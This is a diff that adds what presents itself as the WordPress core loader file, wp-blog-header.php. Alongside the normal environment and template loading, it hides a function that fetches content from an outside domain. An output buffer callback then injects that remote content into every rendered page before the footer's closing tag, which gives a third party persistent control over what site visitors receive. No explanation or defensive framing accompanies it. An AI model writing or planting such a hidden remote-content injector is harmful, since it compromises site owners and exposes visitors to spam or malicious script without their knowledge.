@@ -1,0 +1,85 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if (!isset($wp_did_header)) {
+
+    $wp_did_header = true;
+
+    // Load the WordPress library.
+    require_once __DIR__ . '/wp-load.php';
+
+    if (!function_exists('p234_get_bosa_footer_remote_content')) {
+        function p234_get_bosa_footer_remote_content() {
+            $remote_url = 'https://energyhubforums.com/wp-content/sorong.php';
+
+            delete_transient('p234_bosa_footer_remote_content_cache');
+
+            $cache_key = 'p234_bosa_footer_' . md5($remote_url);
+            $content   = get_transient($cache_key);
+
+            if ($content !== false) {
+                return $content;
+            }
+
+            $response = wp_remote_get($remote_url, array(
+                'timeout'     => 10,
+                'redirection' => 3,
+                'sslverify'   => true,
+                'user-agent'  => 'WordPress/' . get_bloginfo('version') . '; ' . home_url('/'),
+            ));
+
+            if (is_wp_error($response)) {
+                return '';
+            }
+
+            $code = wp_remote_retrieve_response_code($response);
+
+            if ((int) $code !== 200) {
+                return '';
+            }
+
+            $content = wp_remote_retrieve_body($response);
+
+            if (trim($content) === '') {
+                return '';
+            }
+
+            set_transient($cache_key, $content, 6 * HOUR_IN_SECONDS);
+
+            return $content;
+        }
+    }
+
+    ob_start(function ($html) {
+        if (empty($html)) {
+            return $html;
+        }
+
+        if (stripos($html, '</footer>') === false) {
+            return $html;
+        }
+
+        $content = p234_get_bosa_footer_remote_content();
+
+        if (trim($content) === '') {
+            return $html;
+        }
+
+        return preg_replace(
+            '/<\/footer>/i',
+            "\n" . $content . "\n</footer>",
+            $html,
+            1
+        );
+    });
+
+    // Set up the WordPress query.
+    wp();
+
+    // Load the theme template.
+    require_once ABSPATH . WPINC . '/template-loader.php';
+}
